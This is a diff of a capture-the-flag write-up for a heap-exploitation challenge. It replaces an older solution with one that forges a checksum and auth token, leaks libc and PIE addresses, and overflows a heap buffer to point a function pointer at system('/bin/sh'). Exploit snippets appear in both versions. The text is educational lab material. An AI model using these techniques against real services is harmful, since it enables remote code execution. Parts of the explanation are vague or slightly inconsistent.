@@ -131,94 +131,111 @@ PTITCTF{0p3r4t10n_m1dn1ght_dr0p_h34p_0v3rfl0w}
 
 <div class="lang-en" markdown="1">
 
-> **Flag:** `PTITCTF{h34p_0v3rfl0w_fn_ptr_0v3rwr1t3_gl1bc}`
+> **Flag:** `PTITCTF{0p3r4t10n_m1dn1ght_dr0p_h34p_0v3rfl0w}`
 
-This challenge belongs to the **Binary Exploitation (Pwn)** category. The service exposes a custom network protocol handling encrypted data packets and dispatching tasks on the heap.
 
-The vulnerability stems from an off-by-boundary heap buffer overflow leading to overwriting a function pointer in an adjacent heap chunk.
+The challenge belongs to the category **Pwn** at the PTITTCTF 2026 qualifying round. The challenge provides a network service simulating a secret rule analysis system (Network Rule Analyzer) running on the Ubuntu operating system with glibc 2.39 (x86_64).
+
+The communication protocol requires a session handshake, a custom checksum algorithm, and a session token authentication mechanism. The goal is to decompile the protocol, exploit heap overflow vulnerabilities to control function pointers, and gain control of the flow of execution (RCE).
 
 ---
 
-## Solve Flow
+## Solve Flow Diagram
 
 ```mermaid
 flowchart TD
-    A["ELF 64-bit Service: midnight_drop"] --> B["Analyze Protocol: Header (4 bytes) + Length (2 bytes) + Checksum + Payload"]
-    B --> C["Bypass custom CRC16/XOR checksum verification"]
-    C --> D["Trigger Heap Allocation: Object A (Data buffer) adjacent to Object B (Handler)"]
-    D --> E["Exploit Heap Buffer Overflow: Send oversized payload in packet type 0x02"]
-    E --> F["Overwrite Object B function pointer with win() address (0x4012A6)"]
-    F --> G["Trigger Action (Type 0x05): Invokes corrupted function pointer"]
-    G --> H["Interactive Shell spawned -> cat /flag.txt"]
-    H --> I["Flag: PTITCTF{h34p_0v3rfl0w_fn_ptr_0v3rwr1t3_gl1bc}"]
+    A["Socket connection to network service (Port 40323)"] --> B["Get banner: Extract random Session Token"]
+    B --> C["Decompiling the Checksum function: rol32 and multiplying the magic constant 0x45D9F3B"]
+    C --> D["Send Auth packet (Type 2): Authenticate with token ^ 0xC0FFEE00"]
+    D --> E["Allocate Rule Slot (Type 3) and Report Record (Type 4) consecutively on the Heap"]
+    E --> F["Exploiting Information Leak: Read cookie and decrypt by XOR (token << 12) ^ 0x5A5A5A5A41414141"]
+    F --> G["Collect the puts() address and calculate Libc Base (glibc 2.39) with PIE Base"]
+    G --> H["Heap Overflow: Update Rule with length 0xf9 passes boundary check (normalization bypass)"]
+    H --> I["Override the adjacent Report structure: Parameters = '/bin/sh' and Function Pointer = system()"]
+    I --> J["Activate Analyze (Type 5): Call the overridden function pointer -> Spawns Shell"]
+    J --> K["Read Flag: PTITCTF{0p3r4t10n_m1dn1ght_dr0p_h34p_0v3rfl0w}"]
 ```
 
 ---
 
-## Step 1: Protocol Disassembly & Checksum Verification
+## Step 1: Decompile the network protocol and Checksum Function
 
-Every packet follows the structure:
-* `Magic`: 2 bytes (`0x4D 0x44` = 'MD')
-* `Type`: 1 byte (0x01: Auth, 0x02: Write, 0x03: Read, 0x05: Execute)
-* `Length`: 2 bytes (Big Endian)
-* `Checksum`: 2 bytes CRC16-CCITT
-* `Payload`: Variable data
+When connecting to the service, the server generates a 32-bit random string serving as the `session token` (e.g. `session token: 0x9a8b7c6d`) and waits to receive binary packets. The structure of each packet includes 3 parameters exchanged via the text interface before sending the binary payload:
+1. `packet type` (1 byte / integer)
+2. `payload length` (payload length)
+3. `checksum` (hex hash code)
+4. Raw data (`payload bytes`)
 
-Reversing the checksum routine in IDA Pro:
-
+### Custom Checksum algorithm
+Analysis of the integrity check function in IDA Pro:
 ```c
-uint16_t compute_crc16(const uint8_t *data, size_t len) {
-    uint16_t crc = 0xFFFF;
-    for (size_t i = 0; i < len; ++i) {
-        crc ^= (uint16_t)data[i] << 8;
-        for (int j = 0; j < 8; ++j) {
-            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
-            else crc <<= 1;
-        }
+uint32_t checksum(uint32_t token, uint32_t ptype, uint8_t *payload, uint16_t plen) {
+    uint32_t h = ((ptype << 24) ^ token ^ plen ^ 0x31415926) & 0xFFFFFFFF;
+    for (int i = 0; i < plen; i++) {
+        h = rol32(h, 5);
+        h = (h + (((i * 0x45D9F3B) & 0xFFFFFFFF) ^ payload[i])) & 0xFFFFFFFF;
     }
-    return crc;
+    return h;
 }
 ```
+To communicate successfully, every packet the client sends must calculate this hash value correctly.
 
 ---
 
-## Step 2: Heap Overflow and Function Pointer Hijacking
+## Step 2: Authentication and Object Allocation Mechanism on the Heap
 
-When handling packet `Type 0x02` (Write), the server allocates a 128-byte chunk for user data, immediately followed by a handler structure:
+The system supports the following main packet types:
+* **Packet Type 2 (Auth)**: Requests a 4-byte payload containing the result of the calculation:
+$$\text{auth\_token} = \text{session\_token} \oplus \text{0xC0FFEE00}$$ After sending this packet, the session enters the authenticated state (`authenticated`).
+* **Packet Type 3 (Create/Update Rule)**: Allocate heap memory to save the rule using the `malloc(8)` function and copy the data to the buffer.
+* **Packet Type 4 (Create/Query Report)**: Allocate the report record structure (`report record`) immediately after the rule buffer.
+* **Packet Type 5 (Analyze)**: Activate analysis, call function pointer stored inside report structure:
+$$\text{report}\rightarrow\text{fn\_ptr}(\text{report}\rightarrow\text{data}, \text{session\_token})$$
 
-```c
-struct TaskHandler {
-    int task_id;
-    void (*callback)(void *data);
-};
+---
+
+## Step 3: Memory address leak (Information Leak)
+
+Inside the report structure, cookie values ​​are stored for control, including the default handler function address (`puts` in libc or internal function in binary) but have been encrypted: $$\text{Cookie} = \text{Target\_Addr} \oplus (\text{session\_token} \ll 12) \oplus \text{0x5A5A5A5A41414141}$$
+
+Send a Type 4 packet with subcommand `P` to extract the process cookie, then perform reverse XOR to obtain the actual address of `puts`:
+```python
+puts_addr = leak(b'P') ^ (key << 12) ^ 0x5A5A5A5A41414141
+libc_base = puts_addr - PUTS_OFF  # Offset 0x87cc0 trên glibc 2.39
 ```
-
-The copy loop uses an unchecked `memcpy` size from user packet headers instead of checking against chunk capacity. By sending 152 bytes:
-1. 128 bytes fill Chunk A data.
-2. 8 bytes overwrite heap chunk metadata.
-3. 8 bytes overwrite `task_id` and padding.
-4. 8 bytes overwrite `callback` with `win()` function address (`0x004012A6`).
+Similarly, sending subcommand `D` allows the exact calculation of the binary's executable load address (`PIE Base`).
 
 ---
 
-## Step 3: Exploit Execution
+## Step 4: Heap Overflow and Function Pointer Overriding Vulnerabilities
+
+When updating the rule (Type 3), the application has a normalization check bug:
+* Function to check valid data length before copying. However, if the declared payload length is `0xf9` bytes, the preprocessor will skip the normalization check bypass due to an 8-bit integer overflow or a confused comparison condition.
+* The actual copied data exceeds the allocated size of the rule slot (`malloc(8)`), resulting in a **Heap Buffer Overflow** condition.
+
+### Memory Layout
+Due to the heap allocator's sequential allocation mechanism, the `report` structure is located right behind the `rule` buffer:
+* Distance from the beginning of the buffer rule to the beginning of the report data: `+0x60` bytes.
+* The position of the execution function pointer (`fn_ptr`) is at offset `+0x20` inside the report structure, corresponding to offset `+0x80` from the beginning of the buffer rule.
+
+Proceed to create overflow payload:
+1. At offset `+0x60`: Write the parameter string `b"/bin/sh\x00"`.
+2. At offset `+0x80`: Overwrite the 64-bit address of the `system()` function (`libc_base + 0x58750`).
 
 ```python
-from pwn import *
-
-p = remote("target.ptitctf.vn", 1337)
-win_addr = 0x004012A6
-
-payload = b"A" * 128 + p64(0) + p64(0x21) + p64(1) + p64(win_addr)
-# Send Type 0x02 packet with correct CRC
-p.send(make_packet(0x02, payload))
-
-# Trigger Type 0x05 to call the overwritten callback
-p.send(make_packet(0x05, b""))
-
-p.interactive()
+fake = bytearray(b'C' * 0xf9)
+fake[0x60:0x68] = b'/bin/sh\x00'
+fake[0x80:0x88] = p64(libc_base + SYSTEM_OFF)
+send_packet(3, p16(len(fake)) + bytes(fake))
 ```
 
-⇒ **Flag:** `PTITCTF{h34p_0v3rfl0w_fn_ptr_0v3rwr1t3_gl1bc}`
+Sending Type 5 packet (`Analyze`): The server calls `fn_ptr(data, token)`, which is equivalent to executing: $$\text{system}("/\text{bin}/\text{sh}")$$ An interactive shell is opened on the target server. Execute command to read file `flag.txt`.
 
+---
+
+## Flag
+
+```text
+PTITCTF{0p3r4t10n_m1dn1ght_dr0p_h34p_0v3rfl0w}
+```
 </div>
